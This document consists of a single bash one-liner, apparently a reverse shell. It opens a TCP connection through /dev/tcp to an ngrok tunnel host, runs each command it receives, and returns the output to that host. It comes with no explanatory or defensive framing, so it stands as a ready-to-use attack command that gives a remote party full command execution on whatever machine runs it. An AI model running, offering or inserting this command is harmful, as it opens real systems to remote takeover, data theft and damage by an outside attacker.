exec 5<>/dev/tcp/6.tcp.ngrok.io/17328;cat <&5 | while read line; do $line 2>&5 >&5; done
